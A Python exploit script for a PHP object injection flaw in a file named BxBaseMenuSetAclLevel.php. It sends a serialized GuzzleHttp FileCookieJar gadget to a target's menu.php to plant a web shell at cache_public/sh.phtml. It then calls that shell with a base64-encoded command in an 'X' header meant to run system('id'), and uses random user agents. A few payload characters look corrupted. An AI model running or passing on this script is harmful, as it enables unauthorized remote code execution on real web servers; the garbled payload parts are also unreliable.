import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='漏洞存在位置/template/scripts/BxBaseMenuSetAclLevel.php可以PHP对象注入漏洞',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')


args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/menu.php"  # 移除末尾的斜杠
        url1 = args.url[:-1] + "/cache_public/sh.phtml"
    else:
        url = args.url + "/menu.php"
        url1 = args.url + "/cache_public/sh.phtml"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': fake.user_agent(),
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Encoding": "gzip"
}

headers1 = {
    'User-Agent': fake.user_agent(),
    "X": "ZWNobyAnMnZwenJuRnk3cWolalFNVTJVSk1UUnNOUkFzJy4gc31zdGVtKCdpZCcpIC4gJzJ2cHpybkZ5N3FqNWpRTVUyVUpJVFJzdFJBcyc7",
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Encoding": "gzip"
}

data = {
    "o": "sys_set_acl_level",
    "a": "SetAclLevel",
    "level_id": "1",
    "profile_id": "0%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A3%3A%7Bs%3A40%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3B0%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A2%3A%7Bs%3A7%3A%22Expires%22%3Bs%3A0%3A%22%22%3Bs%3A5%3A%22Value%22%3Bs%3A49%3A%22%3C%3Fphp+eval%28base64_decode%28%24_SERVER%5B%27HTTP_X%27%5D%29%29%3B+%3F%3E%22%3B%7D%7D%7D%7Ds%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar0filename%22%3Bs%3A23%3A%22./cache_public/sh.phtml%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7D"    
}



response = requests.post(url=url,
    headers=headers,
    data=data)
response1 = requests.get(url=url1,headers=headers1)

if "uid" in response1.text:
    print("目标url："+ url + '\n' +"访问存放的恶意成功\n")
    print(response1.text)
else:
    print("目标url："+ url + '\n' +"不存在漏洞")
# print(response.text)